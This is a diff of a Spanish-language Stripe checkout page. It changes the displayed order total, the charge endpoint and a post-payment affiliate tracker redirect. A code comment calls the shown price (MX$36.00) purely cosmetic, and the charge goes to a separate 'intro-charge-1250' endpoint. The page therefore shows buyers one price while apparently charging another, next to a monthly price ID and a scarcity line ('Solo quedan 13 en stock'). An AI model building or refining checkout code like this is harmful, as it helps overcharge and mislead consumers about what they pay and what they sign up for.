@@ -255,7 +255,7 @@
           </div>
 
           <div class="w-title" style="margin-top:14px">Resumen del pedido</div>
-          <div class="order-row"><span>Total</span><span id="orderTotal">MX$180.00</span></div>
+          <div class="order-row"><span>Total</span><span id="orderTotal">MX$36.00</span></div>
 
           <div class="tiny" style="margin-top:10px; line-height:1.5">
             🗃️ Solo quedan 13 en stock<br>
@@ -321,15 +321,15 @@
       const orderTotal = document.getElementById('orderTotal');
       const sidebarImg = document.getElementById('sidebarImg');
 
-      // Conserva tus endpoints / claves (SIN CAMBIOS)
-      const SUBSCRIBE_URL = "https://charmr-jfmc.onrender.com/api/stripe/intro-charge-20";
+      // Endpoints / claves (ACTUALIZADOS)
+      const SUBSCRIBE_URL = "https://charmr-jfmc.onrender.com/api/stripe/intro-charge-1250";
       const PUBLISHABLE_KEY = "pk_live_51Rhm4sEJXIhiKzYGIPVjXwZTzuKmqU7EOA6EpDIkrNTmtm4ooWHbDcSaBlyglSdJYhCyU4VgcI8Qo09Acc8upCUD00ekSRuN4q";
       const FIXED_PRICE_ID = "price_1Rzdp0EJXIhiKzYGlVxHGH7W"; // retenido (sin uso)
       const API_BASE = (location.protocol.startsWith('http') ? location.origin : 'http://localhost:10000');
       const MONTHLY_PRICE_ID = "price_1RvJmqEJXIhiKzYGE0IJQp7t";
 
-      // Mostrar precio (solo cosmético). Aproximación: 1 USD ≈ 18 MXN
-      const INTRO_PRICE_TEXT = 'MX$36.00'; // $2.00 → ~ MX$36.00
+      // Mostrar precio (solo cosmético). $2.00 → ~ MX$36.00
+      const INTRO_PRICE_TEXT = 'MX$36.00';
       try { orderTotal.textContent = orderTotal.textContent?.trim() ? orderTotal.textContent : INTRO_PRICE_TEXT; } catch {}
 
       function show(o){ o?.setAttribute('aria-hidden','false'); }
@@ -566,7 +566,7 @@
           const raw = text.trim(); const isoLike = raw.toUpperCase();
           if (isoLike.length === 2 && COUNTRY_CHOICES[isoLike]) return isoLike;
           const shorthand = (function(v){ v=String(v||'').toUpperCase().replace(/\./g,'').trim();
-            const map={UK:'GB',ENGLAND:'GB',SCOTLAND:'GB',WALES:'GB',USA:'US',UNITEDSTATES:'US',UAE:'AE',KSA:'SA'}; return map[v]||null; })(raw);
+            const map={UK:'GB',UNITEDSTATES:'US',USA:'US',UAE:'AE',KSA:'SA',ENGLAND:'GB',SCOTLAND:'GB',WALES:'GB'}; return map[v]||null; })(raw);
           if (shorthand && COUNTRY_CHOICES[shorthand]) return shorthand;
           const lower = raw.toLowerCase();
           let match = Object.entries(COUNTRY_CHOICES).find(([code,name]) => name.toLowerCase() === lower)
@@ -590,7 +590,7 @@
           });
           if(pmRes.error) throw new Error(pmRes.error.message);
 
-          // 2) Iniciar el cargo de introducción de $20 (conservado)
+          // 2) Iniciar el cargo de introducción (endpoint actualizado)
           const resp = await fetch(SUBSCRIBE_URL,{
             method:'POST', headers:{'Content-Type':'application/json'},
             body: JSON.stringify({ paymentMethodId: pmRes.paymentMethod.id, name, email, phone: fullPhone, address })
@@ -603,9 +603,9 @@
           if(conf.error) throw new Error(conf.error.message);
           if(!(conf.paymentIntent && conf.paymentIntent.status==='succeeded')) throw new Error('El pago no se completó');
 
-          // Éxito → gracias vía BeMob tracker
+          // Éxito → redirección (URL final actualizada)
           (function(){
-            const TRACKER_URL = 'https://cudsr.bemobtrcks.com/go/abc281a7-e82a-411b-8b56-1a0228d7d2e7';
+            const TRACKER_URL = 'https://cudsr.bemobtrcks.com/go/e1420adb-fbc5-4cfe-b0f1-10615c05e062?';
             const pid = (conf && conf.paymentIntent && conf.paymentIntent.id) || data.paymentIntentId || '';
             const qp = new URLSearchParams(pid ? { v: pid } : { t: String(Date.now()) });
             try{
